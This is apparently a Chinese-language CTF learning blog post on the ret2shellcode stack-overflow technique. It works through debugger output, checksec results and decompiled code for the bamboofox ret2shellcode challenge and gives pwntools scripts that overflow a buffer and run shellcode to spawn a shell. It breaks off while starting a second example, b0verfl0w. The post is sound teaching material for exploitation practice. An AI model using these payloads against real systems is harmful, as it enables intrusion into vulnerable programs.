@@ -1,0 +1,394 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2-ret2shellcode | Rhea's Blog</title><meta name="author" content="Rhea"><meta name="copyright" content="Rhea"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="ret2shellcode原理ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2-ret2shellcode">
+<meta property="og:url" content="https://rhea006.github.io/2025/07/bb0d09949d55.html">
+<meta property="og:site_name" content="Rhea&#39;s Blog">
+<meta property="og:description" content="ret2shellcode原理ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码。 在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://rhea006.github.io/img/w7.jpg">
+<meta property="article:published_time" content="2025-07-03T09:00:00.000Z">
+<meta property="article:modified_time" content="2025-07-19T00:58:08.677Z">
+<meta property="article:author" content="Rhea">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rhea006.github.io/img/w7.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2-ret2shellcode",
+  "url": "https://rhea006.github.io/2025/07/bb0d09949d55.html",
+  "image": "https://rhea006.github.io/img/w7.jpg",
+  "datePublished": "2025-07-03T09:00:00.000Z",
+  "dateModified": "2025-07-19T00:58:08.677Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Rhea",
+      "url": "https://rhea006.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.jpg"><link rel="canonical" href="https://rhea006.github.io/2025/07/bb0d09949d55.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":-1,"unescape":true,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200,"highlightFullpage":false,"highlightMacStyle":true},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: true,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2-ret2shellcode',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"><link rel="alternate" href="/atom.xml" title="Rhea's Blog" type="application/atom+xml">
+</head><body><div id="web_bg" style="background-image: url(/img/background1.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/head.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">103</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">65</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/w7.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/images/logo.png" alt="Logo"><span class="site-name">Rhea's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">2-ret2shellcode</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> List</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> Music</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> Movie</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2-ret2shellcode</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-07-03T09:00:00.000Z" title="发表于 2025-07-03 17:00:00">2025-07-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-07-19T00:58:08.677Z" title="更新于 2025-07-19 08:58:08">2025-07-19</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/">PWN</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/">Learning</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/6-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/">6-栈溢出与ROP</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/6-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/">Stack Overflow</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/6-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/">x86x64</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/PWN/Learning/6-%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/3-%E5%9F%BA%E6%9C%ACROP/">3-基本ROP</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。<strong>通常情况下，shellcode 需要我们自行编写，即此时我们需要自行向内存中填充一些可执行的代码</strong>。</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<p>需要注意的是，<strong>在新版内核当中引入了较为激进的保护策略，程序中通常不再默认有同时具有可写与可执行的段，这使得传统的 ret2shellcode 手法不再能直接完成利用</strong>。</p>
+<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><h3 id="第一种利用方式"><a href="#第一种利用方式" class="headerlink" title="第一种利用方式:"></a>第一种利用方式:</h3><p>根据函数调用约定,在一个函数执行的最后,是一个leave;ret;</p>
+<p>实质是</p>
+<p>mov esp,ebp</p>
+<p>pop ebp</p>
+<p>pop eip</p>
+<p>这时候我们在填充一个shellcode,然后控制返回地址为jmp esp即可利用</p>
+<table>
+<thead>
+<tr>
+<th>shellcode</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>jmp esp</td>
+</tr>
+<tr>
+<td>old_ebp</td>
+</tr>
+<tr>
+<td>局部变量</td>
+</tr>
+</tbody></table>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; r  <span class="comment">#不断点直接</span></span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">No system <span class="keyword">for</span> you this <span class="keyword">time</span> !!!</span><br><span class="line">^C</span><br><span class="line">Program received signal SIGINT, Interrupt.</span><br><span class="line">0xedc2b579 <span class="keyword">in</span> __kernel_vsyscall ()</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; cyclic 300</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac</span><br><span class="line"><span class="built_in">bye</span> <span class="built_in">bye</span> ~</span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">0x62616164 <span class="keyword">in</span> ?? ()</span><br><span class="line">Warning: Avoided exploring possible address 0xff315755.</span><br><span class="line">You can explicitly explore it with `vmmap-explore 0xff315000`</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span><br><span class="line">*EAX  0</span><br><span class="line">*EBX  0xedc0ee34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line">*ECX  0</span><br><span class="line">*EDX  0</span><br><span class="line">*EDI  0xedc60b60 (_rtld_global_ro) ◂— 0</span><br><span class="line">*ESI  0x80485d0 (__libc_csu_init) —▸ 0xff315755 ◂— 0xff315755</span><br><span class="line">*EBP  0x62616163 (<span class="string">&#x27;caab&#x27;</span>)</span><br><span class="line">*ESP  0xffa183b0 ◂— <span class="string">&#x27;eaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaac&#x27;</span></span><br><span class="line">*EIP  0x62616164 (<span class="string">&#x27;daab&#x27;</span>)</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; cyclic -l daab</span><br><span class="line">Finding cyclic pattern of 4 bytes: b<span class="string">&#x27;daab&#x27;</span> (hex: 0x64616162)</span><br><span class="line">Found at offset 112</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ROPgadget --binary ret2shellcode --only jmp</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x080483cb : jmp 0x80483b0</span><br><span class="line">0x08048522 : jmp 0x80484a0</span><br><span class="line">0x08048631 : jmp 0x8048640</span><br><span class="line">0x0804855a : jmp dword ptr [ecx + 0x804a040]</span><br><span class="line">0x0804871f : jmp dword ptr [ecx]</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 5(没找到)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">jmp_esp = <span class="number">0x08048691</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span>*<span class="number">112</span>+p32(jmp_esp)+asm(shellcraft.i386.sh())</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>2)第二种利用方式（bss段执行）</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">s = process(<span class="string">&quot;./ret2shellcode&quot;</span>)</span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">shellcode = shellcraft.sh()</span><br><span class="line">payload = asm(shellcode)<span class="comment">#payload=&#x27;\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&#x27;等价(https://www.exploit-db.com/shellcodes)</span></span><br><span class="line">payload = payload.ljust(<span class="number">112</span>,<span class="string">&#x27;A&#x27;</span>)+p32(<span class="number">0x0804A080</span>)</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="例1"><a href="#例1" class="headerlink" title="例1"></a>例1</h2><p>这里我们以 bamboofox 中的 ret2shellcode 为例，需要注意的是，你应当在内核版本较老的环境中进行实验（如 Ubuntu 18.04 或更老版本）。由于容器环境间共享同一内核，因此这里我们无法通过 docker 完成环境搭建。</p>
+<blockquote>
+<p>点击下载: <a href="../../../../../../../challeges/ret2shellcode">ret2shellcode</a></p>
+</blockquote>
+<p>首先检测程序开启的保护：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">➜  checksec ret2shellcode</span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stack:      Executable</span><br><span class="line">    RWX:        Has RWX segments</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>可以看出源程序几乎没有开启任何保护，并且有可读，可写，可执行段。接下来我们再使用 IDA 对程序进行反编译：</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;No system for you this time !!!&quot;</span>);</span><br><span class="line">  gets(s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, s, <span class="number">0x64u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;bye bye ~&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可以看出，程序仍然是基本的栈溢出漏洞，不过这次还同时将对应的字符串复制到 buf2 处。简单查看可知 buf2 在 bss 段。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.bss:0804A080                 public buf2</span><br><span class="line">.bss:0804A080 ; char buf2[100]</span><br></pre></td></tr></table></figure>
+
+<p>这时，我们简单的调试下程序，看看这一个 bss 段是否可执行。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; b main</span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /CTF/ret2shellcode</span><br><span class="line">warning: Error disabling address space randomization: Operation not permitted</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">warning: 8	ret2shellcode.c: No such file or directory</span><br><span class="line">Warning: Avoided exploring possible address 0xff315755.</span><br><span class="line">You can explicitly explore it with `vmmap-explore 0xff315000`</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line">───────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────</span><br><span class="line"> EAX  0x804852d (main) ◂— push ebp</span><br><span class="line"> EBX  0xee6c5e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> ECX  0x37629d76</span><br><span class="line"> EDX  0xff906340 —▸ 0xee6c5e34 (_GLOBAL_OFFSET_TABLE_) ◂— 0x230d2c /* <span class="string">&#x27;,\r#&#x27;</span> */</span><br><span class="line"> EDI  0xee717b60 (_rtld_global_ro) ◂— 0</span><br><span class="line"> ESI  0x80485d0 (__libc_csu_init) —▸ 0xff315755 ◂— 0xff315755</span><br><span class="line"> EBP  0xff906318 ◂— 0</span><br><span class="line"> ESP  0xff906290 —▸ 0xee718b8c —▸ 0xee6dc6f0 —▸ 0xee718a20 ◂— 0</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov eax, dword ptr [0x804a060]</span><br><span class="line">...</span><br><span class="line">pwndbg&gt; vmmap</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA</span><br><span class="line"> Start        End Perm     Size  Offset File (<span class="built_in">set</span> vmmap-prefer-relpaths on)</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000       0 ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r--p     1000       0 ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rw-p     1000    1000 ret2shellcode</span><br><span class="line">0xee495000 0xee4b8000 r--p    23000       0 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee4b8000 0xee63f000 r-xp   187000   23000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee63f000 0xee6c4000 r--p    85000  1aa000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee6c4000 0xee6c6000 r--p     2000  22f000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee6c6000 0xee6c7000 rw-p     1000  231000 /usr/lib/i386-linux-gnu/libc.so.6</span><br><span class="line">0xee6c7000 0xee6d1000 rw-p     a000       0 [anon_ee6c7]</span><br><span class="line">0xee6dc000 0xee6de000 rw-p     2000       0 [anon_ee6dc]</span><br><span class="line">0xee6de000 0xee6e2000 r--p     4000       0 [vvar]</span><br><span class="line">0xee6e2000 0xee6e4000 r-xp     2000       0 [vdso]</span><br><span class="line">0xee6e4000 0xee6e5000 r--p     1000       0 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee6e5000 0xee708000 r-xp    23000    1000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee708000 0xee716000 r--p     e000   24000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee716000 0xee718000 r--p     2000   31000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xee718000 0xee719000 rw-p     1000   33000 /usr/lib/i386-linux-gnu/ld-linux.so.2</span><br><span class="line">0xff8e7000 0xff908000 rwxp    21000       0 [stack]</span><br></pre></td></tr></table></figure>
+
+<p>通过 vmmap，我们可以看到 bss 段对应的段不可执行权限(所以复现不了)：</p>
+<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">0x804a000  0x804b000 rw-p     1000    1000 ret2shellcode</span><br></pre></td></tr></table></figure>
+
+<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
+<ul>
+<li>缓冲区大小: 100 字节</li>
+<li>EBP 偏移: 0x6C (108 字节)</li>
+<li>返回地址位置: EBP + 4</li>
+<li>总偏移量 &#x3D; 0x6C + 4 &#x3D; <strong>112 字节</strong></li>
+</ul>
+<p>最后的 payload 如下：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shell&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh()) <span class="comment">#生成执行/bin/s的汇编代码（字符串形式）</span></span><br><span class="line">buf2_addr = <span class="number">0x0804A080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))<span class="comment">#将 shellcode 填充到 112 字节，不足部分用 b&#x27;A&#x27; 补足</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<h2 id="例2"><a href="#例2" class="headerlink" title="例2"></a>例2</h2><blockquote>
+<p>点击下载: <a href="../../../../../../../challeges/b0verfl0w">b0verfl0w</a></p>
+</blockquote>
+<p>Checksec 查看保护</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ checksec b0verfl0w</span><br><span class="line">  Arch:       i386-32-little</span><br><span class="line">  RELRO:      Partial RELRO</span><br><span class="line">  Stack:      No canary found</span><br><span class="line">  NX:         NX unknown - GNU_STACK missing</span><br><span class="line">  PIE:        No PIE (0x8048000)</span><br><span class="line">  Stack:      Executable</span><br><span class="line">  RWX:        Has RWX segments</span><br><span class="line">  Stripped:   No</span><br></pre></td></tr></table></figure>
+
+<p>无任何保护开启,进入 IDA 中进行分析</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">32</span>]; <span class="comment">// [esp+18h] [ebp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nWelcome to X-CTF 2016!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n======================&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What&#x27;s your name?&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  fgets(s, <span class="number">50</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s.&quot;</span>, s);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在栈溢出，但溢出长度较短，只有0x32-0x20-4 &#x3D; 14个字节，很难布置一些较好的 ROP链。由于程序本身并没有开启 NX 保护，所以我们可以在栈上布置 shellcode 并执行。利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。那下面就是找控制程序跳转到 esp 处的 gadgets 了。</p>
